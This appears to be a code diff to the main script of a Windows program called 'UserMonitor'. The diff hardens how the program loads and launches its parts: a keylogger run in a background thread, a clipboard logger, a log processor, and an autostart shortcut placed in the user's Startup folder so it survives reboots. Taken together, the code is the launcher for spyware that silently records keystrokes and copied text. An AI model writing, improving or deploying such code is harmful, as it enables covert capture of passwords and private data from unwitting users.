@@ -27,46 +27,75 @@ logging.info("=== APPLICATION START ===")
 # Fix paths for imports
 if getattr(sys, 'frozen', False):
     BASE_DIR = os.path.dirname(sys.executable)
-    src_path = os.path.join(BASE_DIR, 'src')
-    if src_path not in sys.path:
-        sys.path.insert(0, src_path)
 else:
     BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-    src_path = os.path.join(BASE_DIR, 'src')
-    if src_path not in sys.path:
-        sys.path.insert(0, src_path)
+
+# Добавляем папку src в sys.path
+src_path = os.path.join(BASE_DIR, 'src')
+if src_path not in sys.path:
+    sys.path.insert(0, src_path)
 
 # Import modules
 try:
     from core.clipboard_logger import start_clipboard_logger
     logging.debug("Clipboard logger imported")
-except Exception as e:
+except ImportError as e:
     logging.error(f"Clipboard logger import failed: {e}")
+    # Fallback: попытка прямого импорта
+    try:
+        import sys
+        sys.path.append(os.path.join(BASE_DIR, 'src', 'core'))
+        from clipboard_logger import start_clipboard_logger
+        logging.debug("Clipboard logger imported (fallback)")
+    except ImportError:
+        logging.error("Clipboard logger import completely failed")
+        start_clipboard_logger = None
 
 try:
     from core.process_logs import process_all_logs
     logging.debug("Process logs imported")
-except Exception as e:
+except ImportError as e:
     logging.error(f"Process logs import failed: {e}")
+    try:
+        sys.path.append(os.path.join(BASE_DIR, 'src', 'core'))
+        from process_logs import process_all_logs
+        logging.debug("Process logs imported (fallback)")
+    except ImportError:
+        logging.error("Process logs import completely failed")
+        process_all_logs = None
 
 try:
     from core.keylogger import start_keylogger
     logging.debug("Keylogger imported")
-except Exception as e:
+except ImportError as e:
     logging.error(f"Keylogger import failed: {e}")
+    try:
+        sys.path.append(os.path.join(BASE_DIR, 'src', 'core'))
+        from keylogger import start_keylogger
+        logging.debug("Keylogger imported (fallback)")
+    except ImportError:
+        logging.error("Keylogger import completely failed")
+        start_keylogger = None
 
 try:
     from utils.add_to_autostart import add_to_autostart
     logging.debug("Autostart imported")
-except Exception as e:
+except ImportError as e:
     logging.error(f"Autostart import failed: {e}")
+    try:
+        sys.path.append(os.path.join(BASE_DIR, 'src', 'utils'))
+        from add_to_autostart import add_to_autostart
+        logging.debug("Autostart imported (fallback)")
+    except ImportError:
+        logging.error("Autostart import completely failed")
+        add_to_autostart = None
 
 # Autostart setup
 try:
     startup_dir = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
     shortcut_path = os.path.join(startup_dir, "UserMonitor.lnk")
 
-    if not os.path.exists(shortcut_path):
+    if not os.path.exists(shortcut_path) and add_to_autostart:
         if getattr(sys, 'frozen', False):
             target_path = sys.executable
         else:
@@ -89,29 +118,41 @@ def main():
 
     # Process old logs
     try:
-        process_all_logs()
-        logging.debug("Log processing completed")
+        if process_all_logs:
+            process_all_logs()
+            logging.debug("Log processing completed")
+        else:
+            logging.error("process_all_logs function is not available")
     except Exception as e:
         logging.error(f"Log processing failed: {e}")
 
     # Start clipboard monitor
     try:
-        start_clipboard_logger()
-        logging.debug("Clipboard logger started")
+        if start_clipboard_logger:
+            start_clipboard_logger()
+            logging.debug("Clipboard logger started")
+        else:
+            logging.error("start_clipboard_logger function is not available")
     except Exception as e:
         logging.error(f"Clipboard logger failed: {e}")
 
     # Start keylogger in separate thread
     def run_keylogger_wrapper():
         try:
-            logging.debug("Starting keylogger...")
-            start_keylogger()
+            if start_keylogger:
+                logging.debug("Starting keylogger...")
+                start_keylogger()
+            else:
+                logging.error("start_keylogger function is not available")
         except Exception as e:
             logging.error(f"Keylogger failed: {e}")
 
-    keylogger_thread = threading.Thread(target=run_keylogger_wrapper, daemon=True)
-    keylogger_thread.start()
-    logging.debug("Keylogger thread started")
+    if start_keylogger:
+        keylogger_thread = threading.Thread(target=run_keylogger_wrapper, daemon=True)
+        keylogger_thread.start()
+        logging.debug("Keylogger thread started")
+    else:
+        logging.error("Cannot start keylogger thread - function not available")
 
     # Keep main thread alive
     try:
